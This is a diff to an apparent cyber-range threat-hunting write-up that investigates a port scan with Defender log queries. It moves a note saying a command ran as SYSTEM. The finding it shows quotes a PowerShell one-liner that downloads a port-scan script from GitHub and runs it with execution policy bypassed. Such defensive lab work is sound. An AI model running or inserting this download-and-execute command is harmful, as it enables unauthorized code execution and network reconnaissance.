@@ -66,7 +66,7 @@ A compromised internal host may be engaging in lateral movement or reconnaissanc
 - Failed network connections (potential scanning) 
 - Suspicious process executions
 - File downloads or script execution activity
-- 
+  
 ### Step 1:
 Analyzed DeviceNetworkEvents for failed outbound connection attempts.
 
@@ -117,6 +117,8 @@ DeviceProcessEvents
 ```
 ![DeviceProcessEvents](https://github.com/user-attachments/assets/42402a97-5812-4ae5-9230-e88689618cbc)
 
+Account:
+Executed by SYSTEM — not expected behavior; not triggered by any admin.
 
 Key Finding:
 A PowerShell command was executed at 2025-06-10T08:37:51Z with the following line:
@@ -125,9 +127,6 @@ A PowerShell command was executed at 2025-06-10T08:37:51Z with the following lin
 Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1' -OutFile 'C:\programdata\portscan.ps1';cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1
 
 ```
-
-Account:
-Executed by SYSTEM — not expected behavior; not triggered by any admin.
 
 I logged into the suspect computer and observed the powershell script that was used to conduct the port scan:
 
